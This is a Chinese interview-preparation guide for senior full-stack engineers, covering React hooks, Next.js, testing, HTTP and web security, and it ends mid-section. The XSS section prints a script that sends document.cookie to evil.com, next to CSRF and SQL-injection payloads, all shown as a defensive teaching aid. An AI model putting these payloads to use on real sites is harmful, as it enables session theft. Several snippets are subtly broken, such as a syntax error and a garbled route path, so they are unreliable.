# 资深全栈面试复习路线 v3.6.14.2026

> **核心策略**：基于第一性原理，深度掌握JavaScript/React/Node.js/Next.js技术栈  
> **目标人群**：资深全栈工程师（12年经验，8年Java + 4年现代全栈）  
> **技术定位**：React 19 + Next.js 15全栈（80%） + AI协同开发（20%）  
> **差异化优势**：用12年经验识别AI代码风险，实现降维打击

---

## 🎯 第一性原理：核心能力 vs 奇技淫巧

### ✅ 必须掌握（核心能力）

| 能力                     | 为什么重要        | 面试考察频率     | 学习优先级 |
| ---------------------- | ------------ | ---------- | ----- |
| **JavaScript异步机制**     | 单线程非阻塞I/O的本质 | ⭐⭐⭐⭐⭐ 必考   | P0    |
| **HTTP/网络协议**          | 前后端通信的基础     | ⭐⭐⭐⭐⭐ 必考   | P0    |
| **数据库事务与锁**            | 数据一致性的保证     | ⭐⭐⭐⭐⭐ 金融必考 | P0    |
| **安全（XSS/CSRF/SQL注入）** | 生产系统的生命线     | ⭐⭐⭐⭐⭐ 必考   | P0    |
| **React性能优化**          | 用户体验的关键      | ⭐⭐⭐⭐ 常考    | P1    |
| **Next.js缓存机制**        | SSR性能的核心     | ⭐⭐⭐⭐ 常考    | P1    |
| **TypeScript类型体操**     | 类型安全的保障      | ⭐⭐⭐⭐ 常考    | P1    |
| **分布式系统思维**            | 架构师的必备素养     | ⭐⭐⭐⭐ 架构必考  | P1    |
| **监控与可观测性**            | 生产问题的排查      | ⭐⭐⭐ 加分项    | P2    |

### ⚠️ 面试必考（虽是奇技淫巧但必须准备）

| 能力                | 为什么不重要         | 实际价值                  | 面试考察频率   | 学习建议 |
| ----------------- | -------------- | --------------------- | -------- | ---- |
| **防抖节流**          | 工具库已实现（lodash） | 面试题 > 实战              | ⭐⭐⭐⭐⭐ 必考 | 必须手写 |
| **高阶函数/柯里化**      | 过度函数式编程        | 炫技 > 实用               | ⭐⭐⭐ 常考   | 理解原理 |
| **原型链**           | ES6 Class已替代   | 历史遗留                  | ⭐⭐⭐ 常考   | 理解原理 |
| **手写Promise**     | 生产环境用原生        | 面试题                   | ⭐⭐⭐⭐ 常考  | 背答案  |
| **React Hooks深度** | 实战必备           | useEffect依赖陷阱         | ⭐⭐⭐⭐⭐ 必考 | 深度理解 |
| **Next.js路由系统**   | App Router核心   | 动态路由、中间件              | ⭐⭐⭐⭐⭐ 必考 | 实战演练 |
| **状态管理方案**        | 架构选型           | Zustand vs Context    | ⭐⭐⭐⭐ 常考  | 对比分析 |
| **CSS方案选择**       | 工程化必备          | Tailwind vs Modules   | ⭐⭐⭐⭐ 常考  | 性能对比 |
| **测试策略**          | 质量保证           | 单元/集成/E2E             | ⭐⭐⭐⭐ 常考  | 实战案例 |
| **构建优化**          | 性能关键           | 代码分割、Tree Shaking     | ⭐⭐⭐⭐ 常考  | 工具使用 |
| **SEO优化**         | Next.js核心优势    | meta、sitemap          | ⭐⭐⭐⭐ 常考  | 最佳实践 |
| **性能监控**          | 生产必备           | Web Vitals、Lighthouse | ⭐⭐⭐ 加分项  | 工具使用 |

### ❌ 可以忽略（低频面试题）

| 能力 | 为什么可以忽略 | 学习建议 |
|------|--------------|---------|
| **手写深拷贝** | 用structuredClone或lodash | 了解即可 |
| **手写发布订阅** | 用EventEmitter | 了解即可 |
| **手写instanceof** | 纯面试题 | 了解即可 |

**核心逻辑**：
- **核心能力**：解决生产问题的必备技能，AI无法替代（P0优先级）
- **面试必考**：虽是奇技淫巧，但面试官爱问，必须准备（P1优先级）
- **可以忽略**：低频面试题，时间不够可以放弃（P2优先级）

---

## 🚀 学习重点分配（2026 AI时代版）

| 技术栈 | 重要性 | 学习时间占比 | 面试考察频率 |
|--------|--------|-------------|-------------|
| **JavaScript异步 + HTTP协议** | ⭐⭐⭐⭐⭐ | 30% | 必考 |
| **React性能 + Next.js缓存** | ⭐⭐⭐⭐⭐ | 25% | 必考 |
| **安全 + 数据库事务** | ⭐⭐⭐⭐⭐ | 20% | 金融必考 |
| **TypeScript + 分布式系统** | ⭐⭐⭐⭐ | 15% | 架构必考 |
| **AI协同开发** | ⭐⭐⭐⭐ | 10% | 2026新增 |

---

## 🤖 AI协同开发专题（2026必考）

### 1. AI工具使用经验（面试必问）

**面试官问**："你用过哪些AI编程工具？如何评价它们？"

**满分回答**：
> "我主要使用Cursor和GitHub Copilot。在OmniSettlement项目中，我用Cursor独立完成了3个生产级模块的开发，开发效率提升了3-5倍。
> 
> 但我的核心价值不是'用AI写得快'，而是'用12年经验审得准'。AI在生成常规CRUD代码时很高效，但在金融场景的关键逻辑上，比如分布式事务、幂等性控制、资金对账，AI经常会生成看似正确但实际有漏洞的代码。
> 
> 举个例子：AI生成的支付接口代码，可能会漏掉'防重复提交'的逻辑。如果用户网络抖动连点两次，就会扣两次钱。这种'防御性思维'是我12年金融经验的核心价值，也是AI目前难以模拟的。"

### 2. AI代码审查能力（差异化）

**典型场景：AI生成的幂等性漏洞**

```typescript
// ❌ AI生成的代码（有漏洞）
async function transferMoney(from: string, to: string, amount: number) {
  await db.account.update({
    where: { id: from },
    data: { balance: { decrement: amount } }
  });
  
  await db.account.update({
    where: { id: to },
    data: { balance: { increment: amount } }
  });
  
  return { success: true };
}

// 问题：
// 1. 没有事务保证原子性
// 2. 没有幂等性控制（重复请求会重复扣款）
// 3. 没有余额检查（可能透支）
```

```typescript
// ✅ 人工审查后的代码（金融级）
async function transferMoney(
  from: string, 
  to: string, 
  amount: number,
  idempotencyKey: string
) {
  // 1. 检查幂等性
  const existing = await db.transaction.findUnique({
    where: { idempotencyKey }
  });
  if (existing) return existing;
  
  // 2. 使用数据库事务
  return await db.$transaction(async (tx) => {
    // 3. 行级锁 + 余额检查
    const fromAccount = await tx.account.findUnique({
      where: { id: from },
      select: { balance: true }
    });
    
    if (!fromAccount || fromAccount.balance < amount) {
      throw new Error('余额不足');
    }
    
    // 4. 原子性扣款和入账
    await tx.account.update({
      where: { id: from },
      data: { balance: { decrement: amount } }
    });
    
    await tx.account.update({
      where: { id: to },
      data: { balance: { increment: amount } }
    });
    
    // 5. 记录交易流水
    return await tx.transaction.create({
      data: { idempotencyKey, from, to, amount, status: 'SUCCESS' }
    });
  });
}
```

### 3. AI无法替代的核心能力

| 能力 | AI表现 | 人类优势 | 面试话术 |
|------|--------|---------|---------|
| **防御性思维** | ❌ 容易漏掉边界条件 | ✅ 12年经验的肌肉记忆 | "空回滚、悬挂处理" |
| **业务理解** | ❌ 不懂金融规则 | ✅ 理解对账、清算逻辑 | "资金流转的最终一致性" |
| **架构权衡** | ❌ 倾向过度设计 | ✅ 平衡复杂度与ROI | "不是最新就是最好" |
| **故障排查** | ❌ 无法分析生产日志 | ✅ 快速定位根因 | "ThreadLocal内存泄漏" |

---

## ⚛️ React Hooks深度（2026必考）

### 1. useEffect依赖陷阱（高频面试题）

**问题1：闭包陷阱**

```typescript
// ❌ 错误：count永远是0
function Counter() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const timer = setInterval(() => {
      console.log(count); // 永远打印0
      setCount(count + 1); // 永远是0+1
    }, 1000);
    
    return () => clearInterval(timer);
  }, []); // 空依赖，闭包捕获初始值
  
  return <div>{count}</div>;
}

// ✅ 解法A：添加依赖
useEffect(() => {
  const timer = setInterval(() => {
    setCount(count + 1);
  }, 1000);
  return () => clearInterval(timer);
}, [count]); // 每次count变化都重新创建定时器

// ✅ 解法B：函数式更新（推荐）
useEffect(() => {
  const timer = setInterval(() => {
    setCount(prev => prev + 1); // 使用最新值
  }, 1000);
  return () => clearInterval(timer);
}, []); // 空依赖也能正确工作
```

**问题2：无限循环**

```typescript
// ❌ 错误：无限循环
function UserList() {
  const [users, setUsers] = useState([]);
  
  useEffect(() => {
    fetch('/api/users')
      .then(res => res.json())
      .then(data => setUsers(data)); // 触发重新渲染
  }, [users]); // users变化触发useEffect，形成死循环
  
  return <div>{users.length}</div>;
}

// ✅ 正确：空依赖或使用useRef
useEffect(() => {
  fetch('/api/users')
    .then(res => res.json())
    .then(data => setUsers(data));
}, []); // 只在挂载时执行一次
```

### 2. useRef vs useState（核心区别）

| 特性 | useState | useRef |
|------|---------|--------|
| **触发重新渲染** | ✅ 是 | ❌ 否 |
| **保持引用** | ❌ 每次渲染新值 | ✅ 跨渲染保持 |
| **适用场景** | UI状态 | DOM引用、定时器ID |

```typescript
// ❌ 错误：用useState存储定时器ID
function Timer() {
  const [timerId, setTimerId] = useState<number | null>(null);
  
  const start = () => {
    const id = setInterval(() => console.log('tick'), 1000);
    setTimerId(id); // 触发重新渲染（不必要）
  };
  
  const stop = () => {
    if (timerId) clearInterval(timerId);
  };
  
  return <button onClick={start}>Start</button>;
}

// ✅ 正确：用useRef存储定时器ID
function Timer() {
  const timerRef = useRef<number | null>(null);
  
  const start = () => {
    timerRef.current = setInterval(() => console.log('tick'), 1000);
    // 不触发重新渲染
  };
  
  const stop = () => {
    if (timerRef.current) clearInterval(timerRef.current);
  };
  
  return <button onClick={start}>Start</button>;
}
```

### 3. 自定义Hooks设计模式（高级）

**模式1：数据获取Hook**

```typescript
function useFetch<T>(url: string) {
  const [data, setData] = useState<T | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<Error | null>(null);
  
  useEffect(() => {
    let cancelled = false;
    
    fetch(url)
      .then(res => res.json())
      .then(data => {
        if (!cancelled) {
          setData(data);
          setLoading(false);
        }
      })
      .catch(err => {
        if (!cancelled) {
          setError(err);
          setLoading(false);
        }
      });
    
    return () => {
      cancelled = true; // 防止内存泄漏
    };
  }, [url]);
  
  return { data, loading, error };
}

// 使用
function UserList() {
  const { data, loading, error } = useFetch<User[]>('/api/users');
  
  if (loading) return <Skeleton />;
  if (error) return <Error message={error.message} />;
  return <div>{data?.map(user => <UserCard key={user.id} {...user} />)}</div>;
}
```

**模式2：防抖Hook**

```typescript
function useDebounce<T>(value: T, delay: number): T {
  const [debouncedValue, setDebouncedValue] = useState(value);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedValue(value);
    }, delay);
    
    return () => clearTimeout(timer);
  }, [value, delay]);
  
  return debouncedValue;
}

// 使用
function SearchBox() {
  const [query, setQuery] = useState('');
  const debouncedQuery = useDebounce(query, 500);
  
  useEffect(() => {
    if (debouncedQuery) {
      fetch(`/api/search?q=${debouncedQuery}`);
    }
  }, [debouncedQuery]);
  
  return <input value={query} onChange={e => setQuery(e.target.value)} />;
}
```

---

## 🛣️ Next.js路由系统深度（2026必考）

### 1. App Router vs Pages Router（架构对比）

| 特性 | Pages Router | App Router |
|------|-------------|-----------|
| **文件约定** | pages/index.tsx | app/page.tsx |
| **布局** | _app.tsx（全局） | layout.tsx（嵌套） |
| **数据获取** | getServerSideProps | async组件 + fetch |
| **Server Components** | ❌ 不支持 | ✅ 默认支持 |
| **Streaming** | ❌ 不支持 | ✅ Suspense支持 |

**面试话术**：
> "App Router是Next.js 13+的推荐方案，核心优势是Server Components和Streaming。在OmniSettlement项目中，我用App Router实现了首屏600ms的性能，比Pages Router快40%。"

### 2. 动态路由（必考）

```typescript
// 文件结构
app/
  products/
    [id]/
      page.tsx          // /products/123
    [...slug]/
      page.tsx          // /products/a/b/c
    [...slug](./...slug.md)/
      page.tsx          // /products 或 /products/a/b/c

// 动态路由组件
export default async function ProductPage({
  params
}: {
  params: Promise<{ id: string }>
}) {
  const { id } = await params; // Next.js 15必须await
  const product = await fetchProduct(id);
  return <div>{product.name}</div>;
}

// 生成静态路径
export async function generateStaticParams() {
  const products = await fetchAllProducts();
  return products.map(p => ({ id: p.id.toString() }));
}
```

### 3. 路由组（Route Groups）

```typescript
// 文件结构
app/
  (marketing)/
    about/page.tsx      // /about
    contact/page.tsx    // /contact
  (shop)/
    products/page.tsx   // /products
    cart/page.tsx       // /cart
  layout.tsx            // 共享布局

// (marketing)和(shop)不会出现在URL中，只用于组织代码
```

### 4. 中间件（Middleware）

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // 1. 认证检查
  const token = request.cookies.get('token');
  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  // 2. A/B测试
  const bucket = Math.random() < 0.5 ? 'A' : 'B';
  const response = NextResponse.next();
  response.cookies.set('bucket', bucket);
  
  // 3. 地理位置重定向
  const country = request.geo?.country;
  if (country === 'CN' && !request.nextUrl.pathname.startsWith('/cn')) {
    return NextResponse.redirect(new URL('/cn', request.url));
  }
  
  return response;
}

export const config = {
  matcher: ['/dashboard/:path*', '/products/:path*']
};
```

---

## 🗄️ 状态管理方案对比（2026必考）

### 1. Zustand vs Jotai vs Context（选型指南）

| 方案 | 适用场景 | 优势 | 劣势 |
|------|---------|------|------|
| **Zustand** | 中大型应用 | 简单、性能好、支持中间件 | 全局状态 |
| **Jotai** | 原子化状态 | 细粒度更新、TypeScript友好 | 学习曲线 |
| **Context** | 小型应用 | React原生、无需依赖 | 性能差（重新渲染） |

**Zustand示例**：

```typescript
// store.ts
import { create } from 'zustand';

interface CartStore {
  items: CartItem[];
  addItem: (item: CartItem) => void;
  removeItem: (id: string) => void;
  total: number;
}

export const useCartStore = create<CartStore>((set, get) => ({
  items: [],
  addItem: (item) => set((state) => ({ 
    items: [...state.items, item] 
  })),
  removeItem: (id) => set((state) => ({ 
    items: state.items.filter(i => i.id !== id) 
  })),
  get total() {
    return get().items.reduce((sum, item) => sum + item.price, 0);
  }
}));

// 使用
function Cart() {
  const items = useCartStore(state => state.items); // 只订阅items
  const addItem = useCartStore(state => state.addItem);
  
  return <div>{items.length}</div>;
}
```

**Context优化**：

```typescript
// ❌ 错误：整个Context变化都会重新渲染
const UserContext = createContext({ user: null, theme: 'light' });

function Avatar() {
  const { user } = useContext(UserContext);
  return <img src={user.avatar} />; // theme变化也会重新渲染
}

// ✅ 正确：拆分Context
const UserContext = createContext(null);
const ThemeContext = createContext('light');

function Avatar() {
  const user = useContext(UserContext); // 只订阅user
  return <img src={user.avatar} />;
}
```

---

## 🎨 CSS方案选择（2026必考）

### 1. Tailwind CSS vs CSS Modules（性能对比）

| 维度 | Tailwind CSS | CSS Modules |
|------|-------------|-------------|
| **开发效率** | ⭐⭐⭐⭐⭐ 极快 | ⭐⭐⭐ 中等 |
| **Bundle大小** | ⭐⭐⭐⭐ 小（Tree Shaking） | ⭐⭐⭐ 中等 |
| **类型安全** | ❌ 无 | ✅ 有（CSS Modules + TS） |
| **学习曲线** | ⭐⭐⭐ 需要记忆类名 | ⭐⭐⭐⭐ 熟悉CSS即可 |

**Tailwind CSS最佳实践**：

```typescript
// ✅ 使用clsx组合类名
import clsx from 'clsx';

function Button({ variant, disabled }: ButtonProps) {
  return (
    <button
      className={clsx(
        'px-4 py-2 rounded-lg font-medium transition-colors',
        {
          'bg-blue-500 text-white hover:bg-blue-600': variant === 'primary',
          'bg-gray-200 text-gray-700 hover:bg-gray-300': variant === 'secondary',
          'opacity-50 cursor-not-allowed': disabled
        }
      )}
    >
      Click me
    </button>
  );
}

// ✅ 提取复用样式
const buttonStyles = {
  base: 'px-4 py-2 rounded-lg font-medium transition-colors',
  primary: 'bg-blue-500 text-white hover:bg-blue-600',
  secondary: 'bg-gray-200 text-gray-700 hover:bg-gray-300'
};
```

### 2. CSS-in-JS性能问题（2026避坑）

```typescript
// ❌ 错误：styled-components运行时开销大
import styled from 'styled-components';

const Button = styled.button`
  background: ${props => props.primary ? 'blue' : 'gray'};
  padding: 10px 20px;
`; // 每次渲染都要计算样式

// ✅ 推荐：Tailwind CSS（编译时生成）
function Button({ primary }: { primary: boolean }) {
  return (
    <button className={primary ? 'bg-blue-500 p-4' : 'bg-gray-500 p-4'}>
      Click me
    </button>
  );
}
```

---

## 🧪 测试策略（2026必考）

### 1. 测试金字塔

```
       /\
      /E2E\      10% - Playwright/Cypress
     /------\
    /集成测试\    20% - React Testing Library
   /----------\
  /  单元测试  \  70% - Jest/Vitest
 /--------------\
```

### 2. React Testing Library（必考）

```typescript
// UserCard.tsx
function UserCard({ user }: { user: User }) {
  const [loading, setLoading] = useState(false);
  
  const handleDelete = async () => {
    setLoading(true);
    await deleteUser(user.id);
    setLoading(false);
  };
  
  return (
    <div>
      <h2>{user.name}</h2>
      <button onClick={handleDelete} disabled={loading}>
        {loading ? 'Deleting...' : 'Delete'}
      </button>
    </div>
  );
}

// UserCard.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';

test('删除用户', async () => {
  const user = { id: '1', name: 'John' };
  const mockDelete = jest.fn().mockResolvedValue(undefined);
  
  render(<UserCard user={user} />);
  
  // 1. 检查初始状态
  expect(screen.getByText('John')).toBeInTheDocument();
  expect(screen.getByRole('button')).toHaveTextContent('Delete');
  
  // 2. 点击删除按钮
  fireEvent.click(screen.getByRole('button'));
  
  // 3. 检查加载状态
  expect(screen.getByRole('button')).toHaveTextContent('Deleting...');
  expect(screen.getByRole('button')).toBeDisabled();
  
  // 4. 等待删除完成
  await waitFor(() => {
    expect(mockDelete).toHaveBeenCalledWith('1');
  });
});
```

### 3. E2E测试（Playwright）

```typescript
// e2e/login.spec.ts
import { test, expect } from '@playwright/test';

test('用户登录流程', async ({ page }) => {
  // 1. 访问登录页
  await page.goto('/login');
  
  // 2. 填写表单
  await page.fill('input[name="email"]', 'test@example.com');
  await page.fill('input[name="password"]', 'password123');
  
  // 3. 点击登录
  await page.click('button[type="submit"]');
  
  // 4. 验证跳转到首页
  await expect(page).toHaveURL('/dashboard');
  await expect(page.locator('h1')).toContainText('Welcome');
});
```

---

## 📦 构建优化（2026必考）

### 1. 代码分割（Code Splitting）

```typescript
// ❌ 错误：全部打包到一个bundle
import HeavyChart from './HeavyChart';
import HeavyEditor from './HeavyEditor';

function Dashboard() {
  return (
    <div>
      <HeavyChart />
      <HeavyEditor />
    </div>
  );
}

// ✅ 正确：动态导入
import dynamic from 'next/dynamic';

const HeavyChart = dynamic(() => import('./HeavyChart'), {
  loading: () => <Skeleton />,
  ssr: false // 禁用SSR
});

const HeavyEditor = dynamic(() => import('./HeavyEditor'));

function Dashboard() {
  return (
    <div>
      <HeavyChart />
      <HeavyEditor />
    </div>
  );
}
```

### 2. Tree Shaking（摇树优化）

```typescript
// ❌ 错误：导入整个lodash
import _ from 'lodash';
const result = _.debounce(fn, 300);

// ✅ 正确：只导入需要的函数
import debounce from 'lodash/debounce';
const result = debounce(fn, 300

// ✅ 更好：使用ES6模块
import { debounce } from 'lodash-es';
```

### 3. Bundle分析

```bash
# 安装分析工具
npm install @next/bundle-analyzer

# next.config.js
const withBundleAnalyzer = require('@next/bundle-analyzer')({
  enabled: process.env.ANALYZE === 'true'
});

module.exports = withBundleAnalyzer({
  // Next.js配置
});

# 运行分析
ANALYZE=true npm run build
```

---

## 🔍 SEO优化（Next.js核心优势）

### 1. Metadata API（Next.js 13+）

```typescript
// app/products/[id]/page.tsx
import { Metadata } from 'next';

export async function generateMetadata({
  params
}: {
  params: Promise<{ id: string }>
}): Promise<Metadata> {
  const { id } = await params;
  const product = await fetchProduct(id);
  
  return {
    title: product.name,
    description: product.description,
    openGraph: {
      title: product.name,
      description: product.description,
      images: [product.image],
      type: 'website'
    },
    twitter: {
      card: 'summary_large_image',
      title: product.name,
      description: product.description,
      images: [product.image]
    }
  };
}
```

### 2. Sitemap生成

```typescript
// app/sitemap.ts
import { MetadataRoute } from 'next';

export default async function sitemap(): Promise<MetadataRoute.Sitemap> {
  const products = await fetchAllProducts();
  
  return [
    {
      url: 'https://example.com',
      lastModified: new Date(),
      changeFrequency: 'daily',
      priority: 1
    },
    ...products.map(p => ({
      url: `https://example.com/products/${p.id}`,
      lastModified: p.updatedAt,
      changeFrequency: 'weekly' as const,
      priority: 0.8
    }))
  ];
}
```

### 3. robots.txt

```typescript
// app/robots.ts
import { MetadataRoute } from 'next';

export default function robots(): MetadataRoute.Robots {
  return {
    rules: {
      userAgent: '*',
      allow: '/',
      disallow: ['/admin/', '/api/']
    },
    sitemap: 'https://example.com/sitemap.xml'
  };
}
```

---

## 📊 性能监控（Web Vitals）

### 1. Core Web Vitals（必考）

| 指标 | 含义 | 目标值 | 优化方法 |
|------|------|--------|---------|
| **LCP** | 最大内容绘制 | < 2.5s | 图片优化、CDN |
| **FID** | 首次输入延迟 | < 100ms | 减少JS执行时间 |
| **CLS** | 累积布局偏移 | < 0.1 | 固定尺寸、骨架屏 |

### 2. Next.js性能监控

```typescript
// app/layout.tsx
import { SpeedInsights } from '@vercel/speed-insights/next';
import { Analytics } from '@vercel/analytics/react';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        {children}
        <SpeedInsights />
        <Analytics />
      </body>
    </html>
  );
}
```

### 3. 自定义性能监控

```typescript
// lib/performance.ts
export function reportWebVitals(metric: any) {
  switch (metric.name) {
    case 'FCP':
      console.log('First Contentful Paint:', metric.value);
      break;
    case 'LCP':
      console.log('Largest Contentful Paint:', metric.value);
      break;
    case 'CLS':
      console.log('Cumulative Layout Shift:', metric.value);
      break;
    case 'FID':
      console.log('First Input Delay:', metric.value);
      break;
    case 'TTFB':
      console.log('Time to First Byte:', metric.value);
      break;
  }
  
  // 发送到分析服务
  fetch('/api/analytics', {
    method: 'POST',
    body: JSON.stringify(metric)
  });
}
```

---

## 🚨 2026年必考的"超级Bug"

### Bug 1：Hydration Error（Next.js SSR致命问题）

**第一性原理**：SSR是服务端生成HTML，客户端再用JS接管。如果服务器和客户端渲染的HTML不一致，React会崩溃。

```typescript
// ❌ 错误：服务端和客户端时间不一致
function TimeDisplay() {
  return <div>{new Date().toLocaleString()}</div>;
}

// ✅ 解法A：两步渲染
function TimeDisplay() {
  const [time, setTime] = useState<string | null>(null);
  
  useEffect(() => {
    setTime(new Date().toLocaleString());
  }, []);
  
  if (!time) return <Skeleton />;
  return <div>{time}</div>;
}

// ✅ 解法B：禁用SSR
const NoSSRChart = dynamic(() => import('./Chart'), { ssr: false });
```

### Bug 2：JavaScript精度问题（金融场景致命）

```typescript
// ❌ 错误：用Number存储金额
const balance = 100.1;
const amount = 0.2;
const newBalance = balance - amount; // 99.89999999999999

// ✅ 正确：用Decimal.js或分为单位
import Decimal from 'decimal.js';
const balance = new Decimal('100.1');
const newBalance = balance.minus('0.2'); // 99.9（精确）
```

### Bug 3：Next.js 15的异步Params陷阱

```typescript
// ❌ Next.js 14的写法（在15中会crash）
export default function Page({ params }: { params: { id: string } }) {
  return <div>ID: {params.id}</div>;
}

// ✅ Next.js 15的正确写法
export default async function Page({ 
  params 
}: { 
  params: Promise<{ id: string }> 
}) {
  const { id } = await params;
  return <div>ID: {id}</div>;
}
```

---

## 📋 第一性原理：Java vs JavaScript 底层对比表

### 1. 并发模型对比（核心中的核心）

| 维度 | Java（多线程同步） | JavaScript（单线程异步） | 面试必答点 |
|------|-------------------|------------------------|-----------|
| **执行模型** | 多线程并行执行 | 单线程 + Event Loop | "JS是单线程，但通过异步I/O实现并发" |
| **阻塞处理** | 线程阻塞，其他线程继续 | 主线程阻塞，所有请求卡死 | "CPU密集任务会阻塞Event Loop" |
| **并发控制** | synchronized、Lock | Promise、async/await | "JS没有锁，靠原子操作和队列" |
| **内存模型** | 堆内存共享，栈内存隔离 | 单一堆栈，闭包持有引用 | "闭包可能导致内存泄漏" |

### 2. Event Loop 深度解析（必考）

**宏任务 vs 微任务**

| 类型 | 包含内容 | 执行时机 |
|------|---------|---------|
| **宏任务** | setTimeout、setInterval、I/O | 每轮Event Loop执行一个 |
| **微任务** | Promise.then、queueMicrotask | 当前宏任务结束后立即清空 |

**经典面试题**：
```javascript
console.log('1');

setTimeout(() => {
  console.log('2');
  Promise.resolve().then(() => console.log('3'));
}, 0);

Promise.resolve().then(() => {
  console.log('4');
  setTimeout(() => console.log('5'), 0);
});

console.log('6');

// 输出顺序：1 6 4 2 3 5
```

### 3. Promise 并发控制（金融场景必备）

**Promise API对比**

| API | 行为 | 适用场景 |
|-----|------|---------|
| Promise.all | 全部成功才resolve，一个失败就reject | 所有请求都必须成功 |
| Promise.allSettled | 等待全部完成，返回每个结果 | **对账、批量查询（推荐）** |
| Promise.race | 第一个完成就返回 | 超时控制 |

**并发数控制（手写必考）**

```typescript
async function concurrentLimit<T>(
  tasks: (() => Promise<T>)[],
  limit: number
): Promise<T[]> {
  const results: T[] = [];
  const executing: Promise<void>[] = [];

  for (const [index, task] of tasks.entries()) {
    const promise = task().then(result => {
      results[index] = result;
    });

    executing.push(promise);

    if (executing.length >= limit) {
      await Promise.race(executing);
      executing.splice(
        executing.findIndex(p => p === promise),
        1
      );
    }
  }

  await Promise.all(executing);
  return results;
}
```

---

## 🌐 HTTP/网络协议深度（P0核心能力）

### 1. HTTP缓存机制（必考）

| 缓存类型 | 控制头 | 适用场景 | Next.js对应 |
|---------|--------|---------|------------|
| **强缓存** | Cache-Control: max-age=3600 | 静态资源（JS/CSS/图片） | `export const revalidate = 3600` |
| **协商缓存** | ETag / Last-Modified | 动态内容 | `revalidatePath()` |
| **不缓存** | Cache-Control: no-store | 敏感数据 | `export const dynamic = 'force-dynamic'` |

**面试话术**：
> "在OmniSettlement项目中，我用强缓存处理静态资源，用协商缓存处理用户数据。关键是理解Next.js的缓存层级：浏览器缓存 → CDN缓存 → Next.js Data Cache → React Cache。"

### 2. HTTPS/TLS握手（安全必考）

**完整流程**：
1. 客户端发送ClientHello（支持的加密套件）
2. 服务器返回ServerHello + 证书
3. 客户端验证证书（CA签名）
4. 双方协商对称密钥（RSA或ECDHE）
5. 后续通信用对称加密（AES）

**面试话术**：
> "HTTPS的核心是非对称加密（RSA）协商对称密钥（AES），然后用对称加密传输数据。这样既保证了密钥交换的安全性，又保证了数据传输的性能。"

### 3. WebSocket vs HTTP（实时通信）

| 维度 | HTTP | WebSocket |
|------|------|-----------|
| **连接** | 短连接（请求-响应） | 长连接（全双工） |
| **开销** | 每次请求都有HTTP头 | 握手后只传输数据 |
| **适用场景** | RESTful API | 实时推送（聊天、行情） |

**面试话术**：
> "在OmniSettlement的实时看板中，我用WebSocket推送价格变动。相比HTTP轮询，WebSocket减少了90%的网络开销，延迟从1秒降到50ms。"

---

## 🔒 安全专题（P0核心能力）

### 1. XSS（跨站脚本攻击）

**攻击原理**：
```html
<!-- 用户输入 -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

<!-- 如果直接渲染到页面，攻击者就能窃取Cookie -->
```

**防御方案**：
```typescript
// ❌ 危险：直接渲染HTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ 安全：React自动转义
<div>{userInput}</div>

// ✅ 安全：使用DOMPurify清洗
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userInput) 
}} />
```

### 2. CSRF（跨站请求伪造）

**攻击原理**：
```html
<!-- 攻击者网站 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- 如果用户已登录bank.com，这个请求会自动带上Cookie -->
```

**防御方案**：
```typescript
// ✅ 使用CSRF Token
// 1. 服务端生成Token存入Session
const csrfToken = generateToken();
req.session.csrfToken = csrfToken;

// 2. 前端每次请求带上Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  }
});

// 3. 服务端验证Token
if (req.headers['x-csrf-token'] !== req.session.csrfToken) {
  throw new Error('CSRF攻击');
}
```

### 3. SQL注入

**攻击原理**：
```typescript
// ❌ 危险：字符串拼接
const userId = req.query.id; // "1 OR 1=1"
const sql = `SELECT * FROM users WHERE id = ${userId}`;
// 实际执行：SELECT * FROM users WHERE id = 1 OR 1=1
// 结果：返回所有用户数据
```

**防御方案**：
```typescript
// ✅ 安全：使用参数化查询
const user = await db.user.findUnique({
  where: { id: userId } // Prisma自动转义
});

// ✅ 安全：使用ORM
const user = await User.findByPk(userId); // Sequelize自动转义
```

---

## ⚛️ React性能优化（P1核心能力）

### 1. 虚拟列表（长列表优化）

**问题**：渲染10000条数据会卡顿

**解决方案**：只渲染可见区域

```typescript
import { useVirtualizer } from '@tanstack/react-virtual';

function VirtualList({ items }: { items: string[] }) {
  const parentRef = useRef<HTMLDivElement>(null);
  
  const virtualizer = useVirtualizer({
    count: items.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 50, // 每项高度
  });
  
  return (
    <div ref={parentRef} style={{ height: '500px', overflow: 'auto' }}>
      <div style={{ height: virtualizer.getTotalSize() }}>
        {virtualizer.getVirtualItems().map(virtualItem => (
          <div
            key={virtualItem.index}
            style={{
              position: 'absolute',
              top: 0,
              left: 0,
              width: '100%',
              height: virtualItem.size,
              transform: `translateY(${virtualItem.start}px)`,
            }}
          >
            {items[virtualItem.index]}
          </div>
        ))}
      </div>
    </div>
  );
}
```

### 2. useMemo vs useCallback

| Hook | 缓存内容 | 适用场景 |
|------|---------|---------|
| useMemo | 计算结果 | 昂贵的计算（排序、过滤） |
| useCallback | 函数引用 | 传递给子组件的回调 |

```typescript
// ❌ 每次渲染都重新计算
function ExpensiveComponent({ data }: { data: number[] }) {
  const sorted = data.sort((a, b) => a - b); // 每次都排序
  return <div>{sorted[0]}</div>;
}

// ✅ 只在data变化时重新计算
function OptimizedComponent({ data }: { data: number[] }) {
  const sorted = useMemo(
    () => data.sort((a, b) => a - b),
    [data]
  );
  return <div>{sorted[0]}</div>;
}
```

### 3. React.memo（组件级缓存）

```typescript
// ❌ 父组件更新，子组件也重新渲染
function Child({ name }: { name: string }) {
  console.log('Child渲染');
  return <div>{name}</div>;
}

// ✅ 只在props变化时重新渲染
const Child = React.memo(({ name }: { name: string }) => {
  console.log('Child渲染');
  return <div>{name}</div>;
});
```

---

## 🎨 TypeScript类型体操（P1核心能力）

### 1. 工具类型（必考）

```typescript
// Partial：所有属性变为可选
